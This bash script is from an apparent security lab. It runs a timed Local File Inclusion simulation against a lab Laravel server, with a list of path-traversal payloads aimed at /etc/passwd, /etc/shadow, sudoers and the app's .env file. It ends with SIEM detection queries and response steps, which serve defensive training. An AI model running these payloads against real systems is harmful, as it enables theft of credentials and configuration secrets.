#!/bin/bash
# LFI Attack Simulation
# Author: Lab Vuln
# Version: 1.0

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

function print_status() {
    echo -e "${BLUE}=== $1 ===${NC}"
}

function print_success() {
    echo -e "${GREEN}✅ $1${NC}"
}

function print_error() {
    echo -e "${RED}❌ $1${NC}"
}

function print_warning() {
    echo -e "${YELLOW}⚠️  $1${NC}"
}

print_status "LFI ATTACK SIMULATION"
echo "Lab Vuln - Scenario 2"
echo "Target: MAQ-2 (Laravel Web Application)"
echo "Duration: 20-40 minutes"
echo ""

print_warning "This script simulates Local File Inclusion attacks"
print_warning "This is for educational purposes only!"
echo ""

read -p "Do you want to continue? (y/N): " -n 1 -r
echo
if [[ ! $REPLY =~ ^[Yy]$ ]]; then
    print_warning "Simulation cancelled by user."
    exit 0
fi

# Configuration
TARGET_URL="http://192.168.1.102:8000"  # MAQ-2 URL
ATTACK_DURATION=600  # 10 minutes
DELAY_BETWEEN_ATTEMPTS=3

# LFI payloads to test
LFI_PAYLOADS=(
    "../../../etc/passwd"
    "../../../etc/shadow"
    "../../../etc/hosts"
    "../../../proc/version"
    "../../../proc/cpuinfo"
    "../../../proc/meminfo"
    "../../../var/log/apache2/access.log"
    "../../../var/log/nginx/access.log"
    "../../../var/log/auth.log"
    "../../../etc/issue"
    "../../../etc/motd"
    "../../../etc/group"
    "../../../etc/sudoers"
    "../../../var/log/laravel.log"
    "../../../.env"
    "../../../config/database.php"
    "../../../storage/logs/laravel.log"
    "../../../app/Http/Controllers/UserController.php"
    "../../../routes/web.php"
    "../../../composer.json"
)

# File parameter variations
FILE_PARAMS=("file" "path" "page" "include" "doc" "document" "filename" "pathname")

print_status "CONFIGURATION"
echo "Target URL: $TARGET_URL"
echo "Attack Duration: $ATTACK_DURATION seconds"
echo "Delay between attempts: $DELAY_BETWEEN_ATTEMPTS seconds"
echo ""

# Check if target is reachable
print_status "CHECKING TARGET ACCESSIBILITY"

if curl -s --connect-timeout 5 "$TARGET_URL" > /dev/null 2>&1; then
    print_success "Target is reachable"
else
    print_error "Cannot reach target at $TARGET_URL"
    print_warning "Make sure MAQ-2 (Laravel) is running and accessible"
    exit 1
fi

print_status "STARTING LFI SIMULATION"
echo "This will attempt various LFI payloads"
echo "Monitor SIEM for detection of the attacks"
echo ""

# Create log file for this simulation
LOG_FILE="lfi-simulation-$(date +%Y%m%d-%H%M%S).log"
echo "LFI Attack Simulation Log" > $LOG_FILE
echo "Date: $(date)" >> $LOG_FILE
echo "Target: $TARGET_URL" >> $LOG_FILE
echo "Duration: $ATTACK_DURATION seconds" >> $LOG_FILE
echo "" >> $LOG_FILE

# Start attack
print_status "EXECUTING ATTACK"

start_time=$(date +%s)
attempt_count=0
success_count=0

while [ $(($(date +%s) - start_time)) -lt $ATTACK_DURATION ]; do
    # Select random payload and parameter
    payload=${LFI_PAYLOADS[$RANDOM % ${#LFI_PAYLOADS[@]}]}
    param=${FILE_PARAMS[$RANDOM % ${#FILE_PARAMS[@]}]}
    
    attempt_count=$((attempt_count + 1))
    
    # Create attack URL
    attack_url="$TARGET_URL/$param?$param=$payload"
    
    echo "Attempt $attempt_count: $attack_url" >> $LOG_FILE
    
    # Try the LFI attack
    response=$(curl -s -w "%{http_code}" --connect-timeout 5 "$attack_url" 2>/dev/null)
    http_code="${response: -3}"
    content="${response%???}"
    
    # Check if attack was successful (file content found)
    if [[ "$content" == *"root:"* ]] || [[ "$content" == *"daemon:"* ]] || [[ "$content" == *"bin:"* ]]; then
        print_success "SUCCESS: Found sensitive file content"
        success_count=$((success_count + 1))
        echo "SUCCESS: $attack_url" >> $LOG_FILE
        echo "Content preview: ${content:0:100}..." >> $LOG_FILE
    elif [[ "$http_code" == "200" ]]; then
        print_warning "POTENTIAL: HTTP 200 response"
        echo "POTENTIAL: $attack_url (HTTP $http_code)" >> $LOG_FILE
    else
        echo "FAILED: $attack_url (HTTP $http_code)" >> $LOG_FILE
    fi
    
    # Show progress
    elapsed=$(( $(date +%s) - start_time ))
    remaining=$((ATTACK_DURATION - elapsed))
    echo -ne "\rProgress: $elapsed/$ATTACK_DURATION seconds - Attempts: $attempt_count - Success: $success_count"
    
    sleep $DELAY_BETWEEN_ATTEMPTS
done

echo ""
echo ""
print_status "ATTACK SIMULATION COMPLETE"

# Summary
echo ""
print_status "ATTACK SUMMARY"
echo "Total attempts: $attempt_count"
echo "Successful file reads: $success_count"
echo "Failed attempts: $((attempt_count - success_count))"
echo "Attack duration: $ATTACK_DURATION seconds"
echo "Log file: $LOG_FILE"

# Log summary
echo "" >> $LOG_FILE
echo "=== ATTACK SUMMARY ===" >> $LOG_FILE
echo "Total attempts: $attempt_count" >> $LOG_FILE
echo "Successful file reads: $success_count" >> $LOG_FILE
echo "Failed attempts: $((attempt_count - success_count))" >> $LOG_FILE
echo "Attack duration: $ATTACK_DURATION seconds" >> $LOG_FILE

print_status "SIEM DETECTION INSTRUCTIONS"
echo ""
echo "To detect this attack in SIEM (Graylog), search for:"
echo ""
echo "1. Path traversal patterns:"
echo "   source:MAQ-2 AND message:\"../\" OR message:\"..\\\\\""
echo ""
echo "2. Laravel error logs:"
echo "   source:MAQ-2 AND message:\"file_get_contents\" AND message:\"error\""
echo ""
echo "3. Web server access logs:"
echo "   source:MAQ-2 AND message:\"GET\" AND message:\"file=\""
echo ""
echo "4. Sensitive file access attempts:"
echo "   source:MAQ-2 AND (message:\"/etc/passwd\" OR message:\"/etc/shadow\" OR message:\"/proc/version\")"
echo ""

print_status "RESPONSE PROCEDURES"
echo ""
echo "1. Block suspicious IP addresses"
echo "2. Review web application logs"
echo "3. Check for data exfiltration"
echo "4. Patch LFI vulnerabilities"
echo "5. Implement input validation"
echo "6. Add WAF rules"
echo ""

print_status "VULNERABILITY ASSESSMENT"
echo ""
echo "Files that should be protected:"
echo "- /etc/passwd"
echo "- /etc/shadow"
echo "- /proc/version"
echo "- Laravel .env file"
echo "- Configuration files"
echo "- Log files"
echo ""

print_success "LFI simulation completed!"
print_warning "Check SIEM for attack detection and response" 